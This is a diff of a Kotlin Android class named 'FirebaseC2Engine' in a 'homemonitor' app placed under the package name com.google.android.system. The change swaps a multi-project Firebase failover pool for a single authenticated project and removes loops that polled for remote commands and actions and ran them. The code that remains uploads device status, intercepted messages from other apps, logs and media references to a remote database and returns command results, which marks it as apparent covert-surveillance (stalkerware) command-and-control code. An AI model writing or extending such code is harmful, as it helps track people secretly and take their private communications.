@@ -3,6 +3,8 @@ package com.google.android.system
 import android.content.Context
 import android.os.Build
 import android.util.Log
+import com.google.firebase.auth.FirebaseAuth
+import com.google.android.gms.tasks.Tasks
 import com.homemonitor.WebDashboardApiRouter
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -14,17 +16,26 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
-import java.util.concurrent.atomic.AtomicInteger
+import java.util.concurrent.TimeUnit
+
+/**
+ * AuthState
+ * Expresses accurate Firebase Authentication lifecycle and network state on Android.
+ */
+enum class AuthState {
+    INITIALIZING,
+    AUTHENTICATED,
+    AUTHENTICATION_REQUIRED,
+    TOKEN_EXPIRED,
+    AUTHORIZATION_DENIED,
+    NETWORK_ERROR,
+    AUTHENTICATION_ERROR
+}
 
 /**
  * FirebaseC2Engine
  *
- * Resilient, multi-account Firebase Realtime C2 Engine supporting 1 Primary + 5 Fallback Firebase accounts
- * (6 project instances pool) with automatic round-robin failover on quota, timeout, or HTTP errors.
- *
- * TODO: [C2 TELEMETRY] Dynamic Battery metrics pushing to /status.json (battery, batteryLevel, isCharging)
- * TODO: [C2 ACTION RPC] P2P WebRTC fallback action polling loop at /users/{uid}/devices/{devId}/actions
- * TODO: [C2 MASTER ADMIN] License & Feature Permission state sync with C2TrialManager.kt
+ * Firebase Realtime C2 Engine backed by authoritative Firebase Authentication (`homemonitor-db`).
  */
 class FirebaseC2Engine(
     private val context: Context,
@@ -43,10 +54,11 @@ class FirebaseC2Engine(
     )
 
     private val accountPool = mutableListOf<FirebaseAccountConfig>()
-    private val activeAccountIndex = AtomicInteger(0)
+    @Volatile private var _parentUserId: String = ""
     @Volatile var currentUserId: String = ""
     @Volatile var currentDeviceId: String = ""
     @Volatile var isEngineRunning = false
+    @Volatile var currentAuthState: AuthState = AuthState.INITIALIZING
 
     // Feature Flags synchronized from Master Admin
     @Volatile var featureFlags = mutableMapOf<String, Boolean>(
@@ -67,22 +79,16 @@ class FirebaseC2Engine(
     private fun loadFirebaseAccountPool() {
         try {
             val prefs = SecurityVaultManager.getEncryptedPrefs(context)
-            currentUserId = prefs.getString("user_firebase_uid", "") ?: ""
+            refreshUserIdentity()
             currentDeviceId = getOrCreateDeviceId()
 
             val primaryDb = prefs.getString("fb_primary_db_url", "") ?: ""
             val defaultUrl = if (primaryDb.isNotBlank()) primaryDb else "https://homemonitor-db-default-rtdb.asia-southeast1.firebasedatabase.app"
 
             accountPool.clear()
-            accountPool.add(FirebaseAccountConfig("Primary", defaultUrl))
+            accountPool.add(FirebaseAccountConfig("Primary (homemonitor-db)", defaultUrl))
 
-            for (i in 1..5) {
-                val fbUrl = prefs.getString("fb_fallback_${i}_db_url", "") ?: ""
-                val url = if (fbUrl.isNotBlank()) fbUrl else "https://homemonitor-fallback-$i-rtdb.firebaseio.com"
-                accountPool.add(FirebaseAccountConfig("Fallback #$i", url))
-            }
-
-            Log.i(TAG, "Loaded ${accountPool.size} Firebase Account instances into failover pool.")
+            Log.i(TAG, "Loaded single authoritative Firebase Account instance ($defaultUrl).")
         } catch (e: Exception) {
             Log.e(TAG, "loadFirebaseAccountPool error: ${e.message}")
         }
@@ -90,29 +96,98 @@ class FirebaseC2Engine(
 
     fun getActiveAccount(): FirebaseAccountConfig {
         if (accountPool.isEmpty()) {
-            return FirebaseAccountConfig("Default", "https://homemonitor-c2-default-rtdb.firebaseio.com")
+            return FirebaseAccountConfig("Primary (homemonitor-db)", "https://homemonitor-db-default-rtdb.asia-southeast1.firebasedatabase.app")
         }
-        val idx = activeAccountIndex.get() % accountPool.size
-        return accountPool[idx]
+        return accountPool[0]
     }
 
     private fun rotateToNextFallbackAccount(reason: String) {
-        if (accountPool.size <= 1) return
-        val prevIdx = activeAccountIndex.get()
-        val nextIdx = (prevIdx + 1) % accountPool.size
-        activeAccountIndex.set(nextIdx)
-        Log.w(TAG, "🔄 Firebase Failover Triggered ($reason). Switched from ${accountPool[prevIdx].name} to ${accountPool[nextIdx].name}")
+        Log.w(TAG, "Firebase request error ($reason). Retaining single authoritative project (homemonitor-db).")
+    }
+
+    fun refreshUserIdentity(): String? {
+        try {
+            val auth = FirebaseAuth.getInstance()
+            val currentUser = auth.currentUser
+            if (currentUser != null && currentUser.uid.isNotBlank()) {
+                currentUserId = currentUser.uid
+                currentAuthState = AuthState.AUTHENTICATED
+                val prefs = SecurityVaultManager.getEncryptedPrefs(context)
+                _parentUserId = prefs.getString("parent_firebase_uid", "") ?: currentUserId
+                return currentUserId
+            }
+
+            val prefs = SecurityVaultManager.getEncryptedPrefs(context)
+            val storedUid = prefs.getString("user_firebase_uid", "") ?: ""
+            _parentUserId = prefs.getString("parent_firebase_uid", "") ?: storedUid
+            if (storedUid.isNotBlank()) {
+                currentUserId = storedUid
+                currentAuthState = AuthState.AUTHENTICATED
+                return currentUserId
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "refreshUserIdentity error: ${e.message}")
+        }
+
+        currentUserId = ""
+        _parentUserId = ""
+        currentAuthState = AuthState.AUTHENTICATION_REQUIRED
+        return null
+    }
+
+    fun getParentUserId(): String {
+        if (_parentUserId.isNotBlank()) return _parentUserId
+        val prefs = SecurityVaultManager.getEncryptedPrefs(context)
+        val pUid = prefs.getString("parent_firebase_uid", "") ?: ""
+        if (pUid.isNotBlank()) {
+            _parentUserId = pUid
+            return pUid
+        }
+        return currentUserId
+    }
+
+    fun getAuthToken(): String? {
+        val currentUser = FirebaseAuth.getInstance().currentUser ?: return null
+        return try {
+            val task = currentUser.getIdToken(false)
+            val result = Tasks.await(task, 5, TimeUnit.SECONDS)
+            result.token
+        } catch (e: Exception) {
+            Log.w(TAG, "Failed to retrieve Firebase ID Token: ${e.message}")
+            null
+        }
+    }
+
+    fun buildAuthenticatedRequest(
+        url: String,
+        method: String = "GET",
+        body: okhttp3.RequestBody? = null
+    ): Request? {
+        val uid = refreshUserIdentity()
+        if (uid.isNullOrBlank()) {
+            currentAuthState = AuthState.AUTHENTICATION_REQUIRED
+            Log.w(TAG, "Aborted request to $url: Authentication required")
+            return null
+        }
+
+        val token = getAuthToken()
+        val builder = Request.Builder().url(url)
+        if (!token.isNullOrBlank()) {
+            builder.addHeader("Authorization", "Bearer $token")
+        }
+
+        return when (method.uppercase()) {
+            "POST" -> builder.post(body ?: "".toRequestBody(null))
+            "PUT" -> builder.put(body ?: "".toRequestBody(null))
+            "DELETE" -> builder.delete(body)
+            else -> builder.get()
+        }.build()
     }
 
     fun startEngine() {
         if (isEngineRunning) return
         isEngineRunning = true
-        Log.i(TAG, "Starting Direct-Only WebRTC C2 Engine with Firebase Heartbeat & Telemetry Sync...")
-
-        // Interactive operations use WebRTC DataChannels exclusively per Task 06 Direct-Only P2P policy.
-        // Command polling and Action REST polling fallbacks are disabled for interactive commands.
-        // startCommandPollingLoop()
-        // startActionApiPollingLoop()
+        Log.i(TAG, "Starting Direct-Only WebRTC C2 Engine with Authenticated Firebase Heartbeat & Telemetry...")
         startHeartbeatLoop()
     }
 
@@ -131,31 +206,17 @@ class FirebaseC2Engine(
         }
     }
 
-    fun refreshUserIdentity() {
-        try {
-            val prefs = SecurityVaultManager.getEncryptedPrefs(context)
-            val storedUid = prefs.getString("user_firebase_uid", "") ?: ""
-            if (storedUid.isNotBlank()) {
-                currentUserId = storedUid
-            } else {
-                val email = prefs.getString("user_firebase_email", "") ?: ""
-                if (email.isNotBlank()) {
-                    val normalized = email.trim().lowercase(java.util.Locale.ROOT)
-                    val derivedUid = "usr_" + Math.abs(normalized.hashCode()).toString()
-                    currentUserId = derivedUid
-                    prefs.edit().putString("user_firebase_uid", derivedUid).apply()
-                }
-            }
-        } catch (_: Exception) {}
-    }
-
     private fun sendDeviceHeartbeat() {
-        refreshUserIdentity()
-        val account = getActiveAccount()
-        val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
-        val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
+        val uid = refreshUserIdentity()
+        if (uid.isNullOrBlank()) {
+            Log.w(TAG, "Heartbeat skipped: No authenticated Firebase UID")
+            return
+        }
 
-        val url = "${account.databaseUrl}/users/$uid/devices/$devId/status.json"
+        val parentUid = getParentUserId()
+        val account = getActiveAccount()
+        val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
+        val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/status.json"
 
         try {
             val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
@@ -176,30 +237,33 @@ class FirebaseC2Engine(
             }
 
             val body = statusJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
-            val request = Request.Builder().url(url).put(body).build()
+            val request = buildAuthenticatedRequest(url, "PUT", body) ?: return
 
             httpClient.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) {
-                    if (response.code == 429 || response.code >= 500) {
-                        rotateToNextFallbackAccount("HTTP ${response.code}")
-                    }
+                if (response.isSuccessful) {
+                    currentAuthState = AuthState.AUTHENTICATED
+                } else if (response.code == 401 || response.code == 403) {
+                    currentAuthState = AuthState.AUTHORIZATION_DENIED
+                    Log.e(TAG, "Heartbeat rejected by Firebase security rules (HTTP ${response.code})")
+                } else {
+                    currentAuthState = AuthState.NETWORK_ERROR
                 }
             }
         } catch (e: Exception) {
+            currentAuthState = AuthState.NETWORK_ERROR
             Log.e(TAG, "sendDeviceHeartbeat error: ${e.message}")
-            rotateToNextFallbackAccount(e.message ?: "Network error")
         }
     }
 
     private fun syncMasterAdminFeatureFlags() {
+        refreshUserIdentity() ?: return
+        val parentUid = getParentUserId()
         val account = getActiveAccount()
-        val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
         val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
-
-        val url = "${account.databaseUrl}/users/$uid/devices/$devId/feature_flags.json"
+        val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/feature_flags.json"
 
         try {
-            val request = Request.Builder().url(url).get().build()
+            val request = buildAuthenticatedRequest(url, "GET") ?: return
             httpClient.newCall(request).execute().use { response ->
                 if (response.isSuccessful) {
                     val body = response.body?.string() ?: ""
@@ -219,14 +283,14 @@ class FirebaseC2Engine(
     }
 
     private fun syncMasterAdminLicenseStatus() {
+        refreshUserIdentity() ?: return
+        val parentUid = getParentUserId()
         val account = getActiveAccount()
-        val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
         val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
-
-        val url = "${account.databaseUrl}/users/$uid/devices/$devId/license.json"
+        val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/license.json"
 
         try {
-            val request = Request.Builder().url(url).get().build()
+            val request = buildAuthenticatedRequest(url, "GET") ?: return
             httpClient.newCall(request).execute().use { response ->
                 if (response.isSuccessful) {
                     val body = response.body?.string() ?: ""
@@ -247,183 +311,25 @@ class FirebaseC2Engine(
         return featureFlags[featureKey] ?: true
     }
 
-    private fun startCommandPollingLoop() {
-        scope.launch(Dispatchers.IO) {
-            Log.i(TAG, "Firebase Command Polling Loop Active 🚀")
-            while (isEngineRunning) {
-                try {
-                    val account = getActiveAccount()
-                    val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
-                    val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
-
-                    val url = "${account.databaseUrl}/users/$uid/devices/$devId/commands.json"
-                    val request = Request.Builder().url(url).get().build()
-
-                    httpClient.newCall(request).execute().use { response ->
-                        if (response.isSuccessful) {
-                            val body = response.body?.string() ?: "null"
-                            if (body != "null" && body.startsWith("{")) {
-                                val json = JSONObject(body)
-                                val keys = json.keys()
-                                while (keys.hasNext()) {
-                                    val cmdId = keys.next()
-                                    val cmdObj = json.optJSONObject(cmdId) ?: continue
-                                    val cmdText = cmdObj.optString("text", "")
-                                    val status = cmdObj.optString("status", "pending")
-
-                                    if (status == "pending" && cmdText.isNotBlank()) {
-                                        Log.i(TAG, "Firebase C2 Received Command [$cmdId]: '$cmdText'")
-
-                                        // Mark as processing
-                                        updateCommandStatus(account, uid, devId, cmdId, "processing")
-
-                                        // Dispatch to MonitorService
-                                        commandDispatcher(cmdText, "firebase_$cmdId")
-
-                                        // Mark as completed
-                                        updateCommandStatus(account, uid, devId, cmdId, "completed")
-                                    }
-                                }
-                            }
-                        } else if (response.code == 429 || response.code >= 500) {
-                            rotateToNextFallbackAccount("HTTP ${response.code}")
-                        }
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Command polling exception: ${e.message}")
-                    rotateToNextFallbackAccount(e.message ?: "Exception")
-                }
-                delay(3000L) // 3s polling cycle
-            }
-        }
-    }
-
-    private fun startActionApiPollingLoop() {
-        scope.launch(Dispatchers.IO) {
-            Log.i(TAG, "Firebase Structured Action API Polling Loop Active 🚀")
-            while (isEngineRunning) {
-                try {
-                    val account = getActiveAccount()
-                    val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
-                    val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
-
-                    val url = "${account.databaseUrl}/users/$uid/devices/$devId/actions.json"
-                    val request = Request.Builder().url(url).get().build()
-
-                    httpClient.newCall(request).execute().use { response ->
-                        if (response.isSuccessful) {
-                            val body = response.body?.string() ?: "null"
-                            if (body != "null" && body.startsWith("{")) {
-                                val json = JSONObject(body)
-                                val keys = json.keys()
-                                while (keys.hasNext()) {
-                                    val actionId = keys.next()
-                                    val actionObj = json.optJSONObject(actionId) ?: continue
-                                    val status = actionObj.optString("status", "pending")
-                                    val path = actionObj.optString("path", "/api/summary")
-                                    val method = actionObj.optString("method", "GET")
-                                    val payloadBody = actionObj.optString("body", "")
-
-                                    if (status == "pending") {
-                                        Log.i(TAG, "Firebase Action API Received [$actionId]: $method $path")
-                                        updateActionStatus(account, uid, devId, actionId, "processing")
-
-                                        val pathUri = android.net.Uri.parse(path)
-                                        val httpResponseStr = WebDashboardApiRouter.handleApiRequest(
-                                            context = context,
-                                            method = method,
-                                            cleanPath = pathUri.path ?: path,
-                                            pathUri = pathUri,
-                                            bodyString = payloadBody,
-                                            clientIp = "FIREBASE_RELAY"
-                                        )
-
-                                        val bodyIndex = httpResponseStr.indexOf("\r\n\r\n")
-                                        val responseContent = if (bodyIndex != -1) httpResponseStr.substring(bodyIndex + 4) else httpResponseStr
-
-                                        sendActionResponse(account, uid, devId, actionId, responseContent)
-                                        updateActionStatus(account, uid, devId, actionId, "completed")
-                                    }
-                                }
-                            }
-                        }
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Action API polling exception: ${e.message}")
-                }
-                delay(3000L)
-            }
-        }
-    }
-
-    private fun updateActionStatus(
-        account: FirebaseAccountConfig,
-        uid: String,
-        devId: String,
-        actionId: String,
-        status: String
-    ) {
-        try {
-            val url = "${account.databaseUrl}/users/$uid/devices/$devId/actions/$actionId/status.json"
-            val body = "\"$status\"".toRequestBody("application/json".toMediaTypeOrNull())
-            val request = Request.Builder().url(url).put(body).build()
-            httpClient.newCall(request).execute().close()
-        } catch (_: Exception) {}
-    }
-
-    private fun sendActionResponse(
-        account: FirebaseAccountConfig,
-        uid: String,
-        devId: String,
-        actionId: String,
-        responseContent: String
-    ) {
-        try {
-            val url = "${account.databaseUrl}/users/$uid/devices/$devId/actions/$actionId/response.json"
-            val respBody = (try {
-                JSONObject(responseContent).toString()
-            } catch (_: Exception) {
-                try { JSONArray(responseContent).toString() } catch (_: Exception) { JSONObject.quote(responseContent) }
-            }).toRequestBody("application/json".toMediaTypeOrNull())
-
-            val request = Request.Builder().url(url).put(respBody).build()
-            httpClient.newCall(request).execute().close()
-        } catch (e: Exception) {
-            Log.e(TAG, "sendActionResponse error: ${e.message}")
-        }
-    }
-
-    private fun updateCommandStatus(
-        account: FirebaseAccountConfig,
-        uid: String,
-        devId: String,
-        cmdId: String,
-        status: String
-    ) {
-        try {
-            val url = "${account.databaseUrl}/users/$uid/devices/$devId/commands/$cmdId/status.json"
-            val body = "\"$status\"".toRequestBody("application/json".toMediaTypeOrNull())
-            val request = Request.Builder().url(url).put(body).build()
-            httpClient.newCall(request).execute().close()
-        } catch (_: Exception) {}
-    }
-
     fun sendExecutionResponse(tag: String, resultText: String) {
         if (resultText.isBlank()) return
         scope.launch(Dispatchers.IO) {
+            refreshUserIdentity() ?: return@launch
+            val parentUid = getParentUserId()
             val account = getActiveAccount()
-            val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
             val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
 
             try {
-                val respUrl = "${account.databaseUrl}/users/$uid/devices/$devId/response.json"
+                val respUrl = "${account.databaseUrl}/users/$parentUid/devices/$devId/response.json"
                 val respBody = JSONObject.quote(resultText).toRequestBody("application/json".toMediaTypeOrNull())
-                httpClient.newCall(Request.Builder().url(respUrl).put(respBody).build()).execute().close()
+                val req = buildAuthenticatedRequest(respUrl, "PUT", respBody) ?: return@launch
+                httpClient.newCall(req).execute().close()
 
                 if (tag.startsWith("firebase_")) {
                     val cmdId = tag.removePrefix("firebase_")
-                    val cmdRespUrl = "${account.databaseUrl}/users/$uid/devices/$devId/commands/$cmdId/response.json"
-                    httpClient.newCall(Request.Builder().url(cmdRespUrl).put(respBody).build()).execute().close()
+                    val cmdRespUrl = "${account.databaseUrl}/users/$parentUid/devices/$devId/commands/$cmdId/response.json"
+                    val cmdReq = buildAuthenticatedRequest(cmdRespUrl, "PUT", respBody) ?: return@launch
+                    httpClient.newCall(cmdReq).execute().close()
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "sendExecutionResponse error: ${e.message}")
@@ -433,11 +339,11 @@ class FirebaseC2Engine(
 
     fun submitTelemetry(category: String, messageText: String) {
         scope.launch(Dispatchers.IO) {
+            refreshUserIdentity() ?: return@launch
+            val parentUid = getParentUserId()
             val account = getActiveAccount()
-            val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
             val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
-
-            val url = "${account.databaseUrl}/users/$uid/devices/$devId/telemetry/$category.json"
+            val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/telemetry/$category.json"
 
             try {
                 val entryJson = JSONObject().apply {
@@ -448,11 +354,11 @@ class FirebaseC2Engine(
                 }
 
                 val body = entryJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
-                val request = Request.Builder().url(url).post(body).build()
+                val request = buildAuthenticatedRequest(url, "POST", body) ?: return@launch
 
                 httpClient.newCall(request).execute().use { response ->
-                    if (!response.isSuccessful && (response.code == 429 || response.code >= 500)) {
-                        rotateToNextFallbackAccount("HTTP ${response.code}")
+                    if (response.isSuccessful) {
+                        currentAuthState = AuthState.AUTHENTICATED
                     }
                 }
             } catch (e: Exception) {
@@ -465,8 +371,8 @@ class FirebaseC2Engine(
         if (!isEngineRunning || text.isBlank()) return
         scope.launch(Dispatchers.IO) {
             try {
+                val uid = refreshUserIdentity() ?: return@launch
                 val account = getActiveAccount()
-                val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
                 val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
 
                 val appKey = appName.lowercase().replace(Regex("[^a-z0-9]"), "")
@@ -483,7 +389,7 @@ class FirebaseC2Engine(
                 }
 
                 val body = msgJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
-                val request = Request.Builder().url(url).post(body).build()
+                val request = buildAuthenticatedRequest(url, "POST", body) ?: return@launch
 
                 httpClient.newCall(request).execute().use { response ->
                     if (response.isSuccessful) {
@@ -500,8 +406,8 @@ class FirebaseC2Engine(
         if (!isEngineRunning || contentText.isBlank()) return
         scope.launch(Dispatchers.IO) {
             try {
+                val uid = refreshUserIdentity() ?: return@launch
                 val account = getActiveAccount()
-                val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
                 val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
 
                 val catKey = category.lowercase().replace(Regex("[^a-z0-9_]"), "")
@@ -514,7 +420,7 @@ class FirebaseC2Engine(
                 }
 
                 val body = logJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
-                val request = Request.Builder().url(url).post(body).build()
+                val request = buildAuthenticatedRequest(url, "POST", body) ?: return@launch
 
                 httpClient.newCall(request).execute().use { response ->
                     if (response.isSuccessful) {
@@ -531,8 +437,8 @@ class FirebaseC2Engine(
         if (!isEngineRunning || mediaUrl.isBlank()) return
         scope.launch(Dispatchers.IO) {
             try {
+                val uid = refreshUserIdentity() ?: return@launch
                 val account = getActiveAccount()
-                val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
                 val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
 
                 val url = "${account.databaseUrl}/users/$uid/devices/$devId/media.json"
@@ -544,7 +450,7 @@ class FirebaseC2Engine(
                 }
 
                 val body = mediaJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
-                val request = Request.Builder().url(url).post(body).build()
+                val request = buildAuthenticatedRequest(url, "POST", body) ?: return@launch
 
                 httpClient.newCall(request).execute().use { response ->
                     if (response.isSuccessful) {
